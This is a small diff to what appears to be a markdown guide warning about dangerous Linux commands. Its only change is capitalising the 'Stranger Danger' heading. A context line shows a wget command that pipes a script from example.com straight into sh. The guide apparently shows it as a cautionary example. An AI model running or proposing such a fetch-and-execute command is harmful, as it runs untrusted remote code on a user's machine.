@@ -47,7 +47,7 @@ Redirecting will write raw bytes on your disk partition. What can never will be?
 This command will move all your personal data in the Linux equivalent of a Black Hole.
 
 
-## stranger danger
+## Stranger Danger
 
 `wget http://example.com/something -O – | sh –`
 
